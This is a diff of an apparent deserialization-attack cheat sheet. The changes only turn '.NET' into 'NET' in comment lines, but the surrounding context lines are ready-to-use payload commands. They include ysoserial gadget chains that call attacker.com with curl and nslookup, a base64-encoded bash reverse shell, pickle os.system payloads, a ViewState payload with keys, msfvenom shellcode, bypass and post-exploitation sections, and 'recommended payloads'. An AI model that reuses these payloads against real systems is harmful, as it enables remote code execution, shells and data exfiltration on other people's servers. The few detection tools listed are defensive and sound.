@@ -5,7 +5,7 @@ java -jar ysoserial.jar CommonsCollections5 'curl attacker.com' | base64 -w0
 # Python (pickle)
 python3 -c 'import pickle,os; pickle.dumps(os.system("id"))' | xxd
 
-# .NET (TypeConfuseDelegate)
+# NET (TypeConfuseDelegate)
 ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
 
 # PHP (unserialize)
@@ -15,7 +15,7 @@ echo 'O:8:"stdClass":1:{s:3:"cmd";s:6:"whoami";}' | base64
 # Java: SerialKiller (Safe replacement for ObjectInputStream)
 java -jar SerialKiller.jar --config=configuration.xml
 
-# .NET: DotNetDeserializationScanner
+# NET: DotNetDeserializationScanner
 DotNetDeserializationScanner.exe -u http://target.com/api -d 'base64_payload'
 
 # Universal: GadgetProbe
@@ -28,7 +28,7 @@ java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L
 # Python pickle RCE
 python3 -c 'import pickle,os,base64; print(base64.b64encode(pickle.dumps({"malicious": os.system("id")})))'
 
-# .NET ViewState
+# NET ViewState
 python3 ysoserial.py -p ViewState -g TextFormattingRunProperties -c "calc.exe" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="B97B4E27" --viewstateuserkey="11451ea8a07e" --isdebug=False
 
 #### 4. BYPASS TECHNIQUES
@@ -38,7 +38,7 @@ java -jar ysoserial.jar SignedObject 'curl attacker.com' | base64
 # PHP Type Juggling
 a:2:{i:0;O:4:"User":1:{s:8:"username";s:5:"admin";}i:1;O:4:"User":1:{s:8:"username";s:5:"admin";}}
 
-# .NET Alphanumeric Shellcode
+# NET Alphanumeric Shellcode
 msfvenom -p windows/exec CMD=calc.exe -f alphanum -b '\x00\x0a\x0d'
 
 #### 5. GADGET CHAIN DETECTION
@@ -48,7 +48,7 @@ java -jar gadget-inspector.jar target.jar
 # Python (dill)
 python3 -c 'import dill; print(dill.detect.badobjects(dill.loads(payload)))'
 
-# .NET (DeserializationChecker)
+# NET (DeserializationChecker)
 DeserializationChecker.exe -a TargetAssembly.dll
 
 #### 6. POST-EXPLOITATION
@@ -68,7 +68,7 @@ java -jar ysoserial.jar URLDNS 'http://attacker.com' > payload.bin
 # Python Out-of-Band
 python3 -c 'import pickle,os; pickle.dumps(os.system("curl attacker.com"))'
 
-# .NET HTTP Request
+# NET HTTP Request
 ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "nslookup attacker.com"
 
 #### PRO TIPS:
@@ -80,7 +80,7 @@ ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "nslookup attack
 
 # 2. Critical targets:
 #    - Java RMI endpoints
-#    - .NET ViewState
+#    - NET ViewState
 #    - Python pickle loads()
 #    - PHP unserialize()
 
@@ -103,7 +103,7 @@ ysoserial.exe -f LosFormatter -g TextFormattingRunProperties -c "nslookup attack
 #### RECOMMENDED PAYLOADS:
 #    - Java: CommonsCollections, Groovy, Jdk7u21
 #    - Python: pickle, PyYAML, marshal
-#    - .NET: ObjectDataProvider, TextFormattingRunProperties
+#    - NET: ObjectDataProvider, TextFormattingRunProperties
 #    - PHP: Phar, custom object injection
 
 #### SAMPLE DETECTION SCRIPT:
